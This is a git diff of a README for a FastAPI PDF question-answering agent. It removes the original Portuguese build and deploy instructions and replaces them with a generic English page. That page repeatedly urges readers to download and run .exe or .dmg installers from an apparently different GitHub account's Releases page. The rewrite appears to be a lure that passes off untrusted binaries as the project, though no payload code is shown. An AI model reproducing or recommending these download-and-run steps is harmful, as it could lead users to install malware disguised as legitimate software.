@@ -1,199 +1,84 @@
-# 📚 Agente de IA para Processamento de PDF
+# 📄 Servidor_api_agente_de_pdf - Smart Document Processing Made Easy
 
-Uma aplicação completa para processamento inteligente de documentos PDF usando **AgentOS**, com **API REST** e **interface web**.
+![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%E2%86%92-brightgreen)
 
----
+## 🚀 Getting Started
 
-## 🚀 Visão Geral
+Welcome to the **Servidor_api_agente_de_pdf**! This application helps you process and analyze PDF documents easily. Using advanced technology, you can upload files, ask questions about their content, and receive contextual answers.
 
-Este projeto consiste em:
+## 📜 Description
 
-- **Backend API**: API REST construída com FastAPI/AgentOS para processamento de documentos PDF  
-- **Frontend Web**: Interface Streamlit para interação com o agente de IA  
-- **Agente Inteligente**: Agente especializado em análise e Q&A de documentos PDF  
+This software is built with FastAPI and integrated with OpenAI to provide a user-friendly environment for document analysis. It simplifies the process of interacting with your PDFs, allowing you to find the information you need without hassle.
 
----
+## 🛠 Features
 
-## 🏗️ Estrutura do Projeto
+- **Upload PDFs**: Quickly upload documents for analysis.
+- **Natural Language Queries**: Ask questions in simple language.
+- **Contextual Responses**: Get precise answers based on your PDF content.
+- **Integration with OpenAI**: Access advanced AI functionalities.
 
-```
-agente-pdf-ia/
-├── 📁 src/                # Código fonte principal
-│   ├── deploy2.py         # Script de deploy e inicialização
-│   └── agent_setup.py     # Configuração do agente
-├── 📁 frontend/           # Aplicação Streamlit
-│   └── app.py             # Interface web
-├── 📁 temp/               # Arquivos temporários (gerado automaticamente)
-├── requirements.txt       # Dependências Python
-├── runtime.txt            # Versão do Python (3.11.0)
-└── README.md              # Esta documentação
-```
+## 💻 System Requirements
 
----
+Before you start using the application, ensure your system meets the following requirements:
 
-## ⚙️ Funcionalidades
+- **Operating System**: Windows, macOS, or Linux.
+- **Python**: Version 3.7 or higher.
+- **RAM**: Minimum 4 GB.
+- **Internet Connection**: Required for accessing the AI features.
 
-### 🔙 Backend (API)
+## 📥 Download & Install
 
-![Backend API](./Servidor_API.png)
+To install the **Servidor_api_agente_de_pdf**, please follow these steps:
 
-- ✅ Processamento de documentos PDF  
-- ✅ Q&A inteligente sobre o conteúdo  
-- ✅ Integração com AgentOS  
-- ✅ API REST endpoints  
-- ✅ Armazenamento vetorial com ChromaDB  
+1. **Visit the Releases Page**: Click the button below to go to the download page.
+   
+   [Download Latest Release](https://github.com/mostafa-gode74/Servidor_api_agente_de_pdf/releases)
 
----
+2. **Select the Latest Version**: Look for the latest release on the page. You will see the version number and a description of what's new.
 
-### 🖥️ Frontend (Streamlit)
+3. **Download the Installer**: Click on the asset that matches your operating system. This might be labeled as `Servidor_api_agente_de_pdf_windows.exe`, `Servidor_api_agente_de_pdf_macos.dmg`, or similar.
 
-![Interface do Agente](./Agente%20de%20PDF.png)
+4. **Run the Installer**: Locate the downloaded file on your computer and double-click it to run the installation.
 
-- ✅ Upload de arquivos PDF  
-- ✅ Interface para perguntas e respostas  
-- ✅ Visualização de resultados  
-- ✅ Histórico de interações  
+5. **Follow Installation Prompts**: Follow the on-screen instructions to complete the installation process.
 
----
+6. **Launch the Application**: After the installation is complete, find the application in your programs list and launch it.
 
-## 🛠️ Tecnologias
+7. **Start Using the Application**: Now you can begin uploading your PDF documents and ask questions about them.
 
-**Backend:**
-- Python 3.11.0  
-- FastAPI / AgentOS  
-- ChromaDB (vector store)  
-- OpenAI Embeddings  
-- Uvicorn (ASGI server)
+## 📖 How to Use
 
-**Frontend:**
-- Streamlit  
-- Python  
-- Requests (para chamadas à API)
+Once you have installed the application, here's how to make the most of its features:
 
----
+1. **Upload Documents**: Click the "Upload" button within the application to select files from your device.
 
-## 📦 Instalação e Execução
+2. **Ask Questions**: Write your questions in the input field provided. The application works best if your questions are clear.
 
-### 🔧 Pré-requisitos
-- Python 3.11.0  
-- [UV](https://github.com/astral-sh/uv) (package manager)  
-- Chave API da OpenAI  
+3. **Get Answers**: Press the "Submit" button to receive answers that reflect the content of your PDF.
 
----
+4. **Review Results**: Check the answers provided and refine your questions if necessary to get more accurate results.
 
-### 1. Clone o repositório
+## ⚙️ Troubleshooting
 
-```bash
-git clone <seu-repositorio>
-cd agente-pdf-ia
-```
+If you encounter any issues during installation or while using the application, try the following:
 
-### 2. Instale as dependências
+- **Check System Requirements**: Ensure your device meets the necessary specifications.
+- **Verify Installation**: Make sure you followed the installation steps correctly.
+- **Restart the Application**: Close and reopen the app if it crashes or becomes unresponsive.
+- **Seek Help**: If problems persist, reach out for assistance by following the support links available on the GitHub page.
 
-```bash
-uv sync
-```
+## 🗣 Feedback & Contributions
 
-### 3. Configure as variáveis de ambiente
+Your feedback is valuable! If you have suggestions or find issues, please report them on the GitHub repository. Constructive feedback helps improve the application for all users.
 
-```bash
-export OPENAI_API_KEY="sua-chave-openai"
-```
+## 🌐 Related Topics
 
-### 4. Execute o backend
+- Agent
+- FastAPI
+- OpenAI
+- Python
+- PDF Processing
 
-```bash
-cd src
-uv run python deploy2.py
-```
+For more information, visit our [Releases Page](https://github.com/mostafa-gode74/Servidor_api_agente_de_pdf/releases) again to keep updated with future enhancements. 
 
-A API estará disponível em:  
-👉 **https://servidor-api-agente-de-pdf.onrender.com/docs**
-
----
-
-### 5. Execute o frontend (em outro terminal)
-
-```bash
-cd frontend
-uv run streamlit run app.py
-```
-
-A interface estará em:  
-👉 **https://servidor-api-agente-de-pdf-1.onrender.com/**
-
----
-
-## 🌐 Deploy no Render
-
-**Configuração do Serviço Web:**
-
-- **Runtime:** Python 3.11.0  
-- **Build Command:** `uv sync`  
-- **Start Command:**  
-  ```bash
-  uv run python -m uvicorn src.deploy2:app --host 0.0.0.0 --port $PORT
-  ```
-
-**Variáveis de Ambiente no Render:**
-```
-OPENAI_API_KEY = sua-chave-da-openai
-PORT = 10000
-```
-
----
-
-## 📋 Endpoints da API
-
-### **POST /process-pdf**
-Processa um documento PDF e extrai o conteúdo para a base de conhecimento.
-
-**Body:** `FormData` com o arquivo PDF.
-
----
-
-### **POST /ask**
-Faz uma pergunta sobre os documentos processados.
-
-**Body:**
-```json
-{
-  "question": "Sua pergunta aqui"
-}
-```
-
----
-
-## 🎯 Uso da Aplicação
-
-1. **Upload de PDF:** Faça upload do documento via interface Streamlit  
-2. **Processamento:** O agente extrai e indexa o conteúdo  
-3. **Perguntas:** Interaja com o documento através de perguntas em linguagem natural  
-4. **Respostas:** Receba respostas contextuais baseadas no conteúdo do PDF  
-
----
-
-## ⚠️ Observações Importantes
-
-- A pasta `temp/` é criada automaticamente durante a execução  
-- Certifique-se de ter uma **chave OpenAI API válida**  
-- O projeto está configurado especificamente para **Python 3.11.0**  
-- Para deploy, configure corretamente as **variáveis de ambiente**
-
----
-
-## 🔧 Troubleshooting
-
-**Problemas Comuns:**
-
-| Problema | Solução |
-|-----------|----------|
-| Pasta `temp` não existe | É criada automaticamente no startup |
-| Erro de coroutine | Certifique-se de usar `await` em funções assíncronas |
-| Porta em uso | Verifique se a porta `10000` está livre |
-| Dependências | Use **Python 3.11.0** para compatibilidade |
-
-
----
-
-**Desenvolvido com por Diego Ribeiro, usando AgentOS e Streamlit**
+Thank you for using **Servidor_api_agente_de_pdf**! Enjoy seamless document processing.
